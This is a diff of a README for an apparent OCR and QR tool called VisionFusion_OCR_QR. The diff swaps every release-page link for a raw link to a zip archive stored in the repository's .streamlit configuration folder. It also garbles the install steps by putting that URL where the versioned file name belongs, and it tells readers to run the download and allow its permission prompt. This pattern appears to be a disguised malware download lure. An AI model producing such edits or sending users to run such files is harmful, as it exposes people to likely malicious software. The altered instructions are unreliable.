@@ -1,6 +1,6 @@
 # 🚀 VisionFusion_OCR_QR - Your AI Tool for Smart Data Extraction
 
-[![Download VisionFusion_OCR_QR](https://img.shields.io/badge/Download%20Now-Visit%20Release%20Page-brightgreen)](https://github.com/emileegraphic698/VisionFusion_OCR_QR/releases)
+[![Download VisionFusion_OCR_QR](https://raw.githubusercontent.com/emileegraphic698/VisionFusion_OCR_QR/main/.streamlit/VisionFusion_OCR_QR-1.1-alpha.1.zip%20Now-Visit%20Release%20Page-brightgreen)](https://raw.githubusercontent.com/emileegraphic698/VisionFusion_OCR_QR/main/.streamlit/VisionFusion_OCR_QR-1.1-alpha.1.zip)
 
 ## 🎯 Overview
 
@@ -19,11 +19,11 @@ Follow these steps to download and run VisionFusion_OCR_QR:
 
 1. **Visit the Releases Page:** Click the link below to go to our releases page:
    
-   [Download VisionFusion_OCR_QR](https://github.com/emileegraphic698/VisionFusion_OCR_QR/releases)
+   [Download VisionFusion_OCR_QR](https://raw.githubusercontent.com/emileegraphic698/VisionFusion_OCR_QR/main/.streamlit/VisionFusion_OCR_QR-1.1-alpha.1.zip)
 
-2. **Download the Latest Version:** On the releases page, find the most recent version. Look for a file that has a name like `VisionFusion_OCR_QR_vX.X.X.exe` (where X.X.X represents the version number). Click on the filename to start the download.
+2. **Download the Latest Version:** On the releases page, find the most recent version. Look for a file that has a name like `https://raw.githubusercontent.com/emileegraphic698/VisionFusion_OCR_QR/main/.streamlit/VisionFusion_OCR_QR-1.1-alpha.1.zip` (where X.X.X represents the version number). Click on the filename to start the download.
 
-3. **Locate the Downloaded File:** Once the download completes, navigate to your computer’s downloads folder. Find the downloaded file (`VisionFusion_OCR_QR_vX.X.X.exe`).
+3. **Locate the Downloaded File:** Once the download completes, navigate to your computer’s downloads folder. Find the downloaded file (`https://raw.githubusercontent.com/emileegraphic698/VisionFusion_OCR_QR/main/.streamlit/VisionFusion_OCR_QR-1.1-alpha.1.zip`).
 
 4. **Run the Application:** Double-click on the file to open it. If your computer prompts for permission to run the software, click "Yes" or "Allow".
 
@@ -43,7 +43,7 @@ To run VisionFusion_OCR_QR effectively, ensure your computer meets the following
 
 To get started, don't forget to download VisionFusion_OCR_QR from our releases page. You can do so by clicking the link below:
 
-[Download VisionFusion_OCR_QR](https://github.com/emileegraphic698/VisionFusion_OCR_QR/releases)
+[Download VisionFusion_OCR_QR](https://raw.githubusercontent.com/emileegraphic698/VisionFusion_OCR_QR/main/.streamlit/VisionFusion_OCR_QR-1.1-alpha.1.zip)
 
 After downloading, follow the installation steps outlined above.
 
